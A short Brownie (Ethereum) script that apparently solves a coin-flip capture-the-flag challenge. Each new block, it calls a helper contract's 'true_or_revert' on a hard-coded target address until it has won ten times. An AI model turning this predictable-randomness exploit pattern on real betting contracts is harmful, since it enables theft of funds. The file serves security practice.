import brownie
from brownie import accounts, coinflip, chain
import time
def main():
#    accounts.load("testacc")
    last_block = chain.height
    wins = 7
    while wins <= 10:
        block = chain.height
        if block != last_block:
            last_block = block
            try:
                coinflip[-1].true_or_revert("0x92283795847FEa19c1c93AE7f767615602B5Ec42", {"from": accounts[0]})
                wins += 1
            except ValueError:
                pass
            
        else:
            time.sleep(1)
        print(wins)
        print(chain.height)
            
